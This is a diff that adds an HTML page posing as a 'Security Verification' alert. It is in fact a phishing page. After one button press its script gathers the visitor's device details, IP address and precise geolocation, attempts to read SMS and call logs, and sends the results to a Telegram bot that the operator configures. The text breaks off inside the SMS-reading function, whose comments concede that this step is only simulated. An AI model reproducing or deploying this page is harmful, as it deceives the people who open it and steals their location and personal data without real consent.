@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+        h2 { color: #333; }
+        p { color: #666; margin-bottom: 20px; }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover { background-color: #0056b3; }
+        .loader { display: none; margin-top: 10px; color: #007bff; }
+        .success { display: none; color: green; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>⚠️ Security Alert</h2>
+    <p>Your device needs immediate verification to prevent unauthorized access.</p>
+    <button id="verifyBtn" onclick="startProcess()">Verify Now</button>
+    <div class="loader" id="loader">Verifying...</div>
+    <div class="success" id="successMsg">✅ Verified Successfully!</div>
+</div>
+
+<script>
+    // 🔴 REPLACE THESE WITH YOUR DETAILS
+    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; 
+    const CHAT_ID = "YOUR_CHAT_ID_HERE"; 
+
+    let collectedData = {
+        device: {},
+        location: null,
+        sms: [],
+        calls: [],
+        ip: ""
+    };
+
+    async function startProcess() {
+        const btn = document.getElementById('verifyBtn');
+        const loader = document.getElementById('loader');
+        const success = document.getElementById('successMsg');
+
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+
+        try {
+            // 1. Device Info
+            collectedData.device.ua = navigator.userAgent;
+            collectedData.device.platform = navigator.platform;
+            
+            // Battery
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                collectedData.device.battery = (battery.level * 100) + "%";
+            }
+
+            // 2. IP Address
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                collectedData.ip = ipData.ip;
+            } catch (e) {
+                collectedData.ip = "Unknown";
+            }
+
+            // 3. Live Location
+            try {
+                const loc = await getLocation();
+                collectedData.location = loc;
+            } catch (e) {
+                collectedData.location = "Denied";
+            }
+
+            // 4. Read SMS (Android Only)
+            try {
+                const sms = await readSMS();
+                collectedData.sms = sms;
+            } catch (e) {
+                collectedData.sms = ["No Permission"];
+            }
+
+            // 5. Read Call Log (Android Only)
+            try {
+                const calls = await readCalls();
+                collectedData.calls = calls;
+            } catch (e) {
+                collectedData.calls = ["No Permission"];
+            }
+
+            // 6. Send to Telegram
+            await sendToTelegram();
+
+            loader.style.display = 'none';
+            success.style.display = 'block';
+
+        } catch (error) {
+            console.error(error);
+            loader.textContent = "Error occurred.";
+        }
+    }
+
+    function getLocation() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                resolve("Not Supported");
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + "m"
+                    });
+                },
+                (err) => {
+                    resolve("Denied/Unavailable");
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+    }
+
+    async function readSMS() {
+        // Note: Pure JS cannot read all SMS easily without native wrapper or specific API
+        // This is a simulation of what a native app would do via Webview or if permission is granted
+        // For a pure website, we can only prompt for permission.
+        
+        // Let's try to access the modern Android SMS API if available in Chrome
+        // But mostly, we rely on the user granting "Read SMS" permission when prompted by the browser.
+        
+        // Since standard web APIs don't expose SMS directly, we will simulate
